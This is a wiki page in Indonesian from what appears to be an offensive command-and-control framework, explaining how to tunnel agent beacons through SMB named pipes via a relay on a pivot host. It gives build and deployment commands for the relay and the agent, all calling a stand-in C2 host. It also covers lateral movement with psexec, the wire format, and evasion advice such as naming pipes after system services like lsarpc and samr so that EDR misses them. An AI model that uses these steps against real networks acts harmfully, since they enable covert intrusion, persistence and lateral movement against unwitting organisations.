# Transport: SMB Named Pipe

Agent mengirim data C2 melalui Windows named pipe (`\\.\pipe\<nama>`) ke sebuah **relay binary** yang berjalan di host perantara. Relay meneruskan traffic ke server C2 via HTTPS. Transport ini dirancang untuk **lateral movement** — agent di host deep-internal yang tidak punya akses internet bisa beacon melalui host pivot yang punya akses ke C2.

---

## Kapan Dipakai

- **Lateral movement** — agent di host internal (DC, workstation, server) tanpa egress internet
- Environment yang block semua outbound TCP/UDP kecuali SMB (port 445) antar-host internal
- Ketika kamu mau sembunyikan C2 traffic di dalam file sharing/SMB traffic yang normal
- Sebagai backup transport ketika HTTP/HTTPS outbound diblock

> **OPSEC note**: SMB antar-host Windows adalah traffic sangat umum di Active Directory environment. Named pipe connection via port 445 blend-in sempurna. Tapi: relay host butuh admin privileges untuk create named pipe, dan koneksi ke relay harus melalui standard SMB (port 445) yang mungkin di-log oleh EDR/SIEM.

---

## Arsitektur

```
[Agent] --SMB :445--> [Relay Host]
   (internal host)    (pivot host)   --HTTPS :443--> [Team Server]
   no internet             ↑
                     berjalan sebagai
                     smb_relay.exe
```

Komponen:
1. **Agent** (`--transport smb`) — di host internal tanpa internet
2. **SMB Relay** (`smb_relay.exe`) — di host pivot yang punya akses ke C2 dan bisa di-reach via SMB dari agent
3. **Team Server** — C2 server (di luar, internet-facing)

---

## Komponen Relay

Relay adalah binary **terpisah** dari server C2:

```
cmd/listener/smb_relay.go
```

Harus di-compile dan di-deploy di **relay/pivot host** (Windows), bukan di server C2.

---

## Step 1 — Compile Relay Binary

Di mesin Linux/Windows dengan Go terinstall:

```bash
# Compile untuk Windows (relay berjalan di Windows)
GOOS=windows GOARCH=amd64 go build \
  -o smb_relay.exe \
  ./cmd/listener/

# Atau dari Windows langsung
go build -o smb_relay.exe ./cmd/listener/
```

---

## Step 2 — Deploy dan Jalankan Relay

Transfer `smb_relay.exe` ke **relay/pivot host** (Windows). Jalankan:

```bash
# Basic — pipe bernama "svcctl", forward ke C2
smb_relay.exe \
  --pipe svcctl \
  --c2 https://c2.example.com

# Dengan AES key dan multiple instances
smb_relay.exe \
  --pipe msrpc \
  --c2 https://c2.example.com \
  --key MySecretKey32Chars00000000000000 \
  --instances 10
```

| Flag | Default | Keterangan |
|------|---------|-----------|
| `--pipe` | (required) | Nama pipe (tanpa `\\.\pipe\` prefix). Contoh: `svcctl`, `msrpc`, `browser` |
| `--c2` | (required) | URL server C2 (HTTPS direkomendasikan) |
| `--key` | — | AES key — harus match server dan agent |
| `--instances` | `10` | Max concurrent named pipe instances |

**Pipe name yang umum dipakai untuk blend-in:**

| Pipe Name | Dipakai oleh (mimik) |
|-----------|---------------------|
| `svcctl` | Service Control Manager |
| `msrpc` | Microsoft RPC |
| `browser` | Computer Browser service |
| `lsarpc` | LSA |
| `samr` | Security Account Manager |
| `netlogon` | Netlogon service |

**Expected log saat relay start:**
```
[*] SMB Relay starting
    Pipe  : \\.\pipe\svcctl
    C2    : https://c2.example.com
[+] Listening...
```

Saat agent connect:
```
[+] Client connected: <session-id>
```

### Catatan privileges

- Named pipe creation di Windows **tidak selalu butuh admin**. Default pipe ACL memungkinkan standard user create pipe.
- Tapi untuk pipe yang nama-nya mirip system pipe (`svcctl`, `lsarpc`): beberapa EDR flag ini sebagai suspicious jika bukan SYSTEM/service yang buat.
- Opsi: jalankan relay sebagai service untuk persistence.

---

## Step 3 — Start Team Server

Server C2 tidak butuh flag khusus untuk SMB. Relay forward traffic sebagai HTTP POST/GET biasa:

```bash
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 \
  go run ./cmd/server \
  --tls \
  --tls-cert server.crt \
  --tls-key server.key \
  -port 8080
```

Relay connect ke `https://c2.example.com` — dari perspektif server ini adalah koneksi HTTPS normal dari relay host.

---

## Step 4 — Generate Agent (SMB)

```bash
go run ./cmd/generate/ stageless \
  --c2 https://c2.example.com \
  --key MySecretKey32Chars00000000000000 \
  --transport smb \
  --smb-relay 192.168.1.50 \
  --smb-pipe svcctl \
  --output bin/agent_smb.exe
```

| Flag | Default | Keterangan |
|------|---------|-----------|
| `--transport smb` | — | **Wajib** untuk SMB transport |
| `--smb-relay` | — | **Wajib** — hostname atau IP relay host |
| `--smb-pipe` | `svcctl` | Nama pipe yang sama dengan relay `--pipe` flag |

Agent akan connect ke: `\\192.168.1.50\pipe\svcctl`

---

## Step 5 — Deploy dan Jalankan Agent

Transfer `agent_smb.exe` ke **host internal** (bukan relay host). Jalankan:

```
agent_smb.exe
```

Atau via post-exploitation (lateral movement, misalnya via `psexec`, `wmiexec`, `dcom`):

```bash
# Via operator console — lateral movement setelah agent pertama established
go run ./cmd/operator/ lateral --method psexec \
  --agent <current-agent-id> \
  --target 192.168.1.100 \
  --payload bin/agent_smb.exe
```

---

## Step 6 — Verify Checkin

**Relay log:**
```
[+] Client connected: <session>
[*] Frame received: type=0x00 len=<bytes>
[*] Forwarding to C2...
[+] C2 response: 200 OK
```

**Server log:**
```
[+] Agent checkin: <agent-id>  192.168.1.100  CORP-WS01  domain\user  windows/amd64
```

Perhatikan: IP yang tercatat di server adalah IP **relay host** (192.168.1.50), bukan host agent yang sebenarnya (192.168.1.100). Ini by design — relay adalah yang connect ke C2.

---

## Step 7 — Verify Traffic via Wireshark

### Di relay host — traffic ke C2

```
tcp.port == 443 && ip.dst == <c2-server-ip>
```

Terlihat: HTTPS POST ke server C2 — identik dengan web traffic biasa.

### Di agent host — SMB traffic ke relay

```
tcp.port == 445 && smb
```

Atau lebih spesifik:
```
smb.path contains "svcctl"
```

SMB frame breakdown:
- SMB2 IOCTL / WriteFile / ReadFile ke named pipe
- Magic bytes di payload: `0x54425550` ("TBUP")

### tcpdump di relay host

```bash
# Lihat SMB masuk dari agent
tcpdump -i eth0 -n "tcp port 445 and src host 192.168.1.100"

# Lihat HTTPS keluar ke C2
tcpdump -i eth0 -n "tcp port 443 and dst host <c2-ip>"
```

---

## Wire Format Detail

**Agent → Relay (named pipe binary frame):**
```
[magic: 0x54425550 (4 bytes LE)]
[type:  0x00=data | 0x01=poll | 0x02=ack (1 byte)]
[len:   payload length (4 bytes LE)]
[payload: JSON (encrypted_payload + agent_id)]
```

**Relay → C2 (HTTP forwarding):**
- Data frame (type 0x00) → `POST /api/v1/checkin` body = payload JSON
- Poll frame (type 0x01) → `GET /api/v1/command/<sessionID>/next`

**Relay → Agent (ack frame):**
```
[magic: 0x54425550]
[type:  0x02 (ack)]
[len:   C2 response length]
[payload: C2 HTTP response body]
```

---

## Deployment Scenarios

### Scenario 1: Internet-facing pivot

```
[Corporate LAN]              [DMZ]           [Internet]
Agent (no egress) --SMB--> Relay ------HTTPS-----> C2 Server
```

### Scenario 2: Double hop

```
Agent --SMB--> Relay1 --SMB--> Relay2 --HTTPS--> C2
```

Tidak supported native — Relay binary hanya forward ke C2 via HTTP, tidak forward ke relay lain. Workaround: jalankan relay di Relay2, relay di Relay1 buat koneksi ke Relay2 via SOCKS dari agent. Untuk setup ini, pakai pivot SOCKS dulu (lihat [wiki/17-network-pivot.md](17-network-pivot.md)).

---

## Troubleshooting

| Symptom | Penyebab | Solusi |
|---------|----------|--------|
| `CreateNamedPipe: Access is denied` | Relay butuh elevated privilege untuk pipe name itu | Jalankan relay sebagai Administrator, atau ganti nama pipe ke yang tidak restricted |
| Agent: `SMB open: CreateFile: The network path was not found` | Relay host tidak reachable via SMB (port 445 diblock) | Cek firewall; test `Test-NetConnection 192.168.1.50 -Port 445` dari target |
| Agent: `SMB open: CreateFile: The system cannot find the file specified` | Pipe belum dibuat (relay tidak jalan atau nama pipe beda) | Pastikan relay jalan, dan `--smb-pipe` agent == `--pipe` relay |
| Relay: `Bad magic: 0x...` | Versi agent tidak match relay (frame format beda) | Rebuild agent dan relay dari source yang sama |
| Server tidak melihat agent (relay connect tapi checkin gagal) | `--key` relay tidak match `ENCRYPTION_KEY` server | Set `--key` relay sama dengan server `ENCRYPTION_KEY` |
| Relay log `C2 proxy error: x509 certificate signed by unknown authority` | C2 pakai self-signed cert | Jalankan relay dengan `--insecure` flag atau beri relay cert yang valid |
| Agent muncul di server dengan IP relay, bukan IP agent | Normal behavior — relay adalah yang connect ke C2 | Untuk track IP agent sebenarnya, lihat agent metadata (hostname, username) |
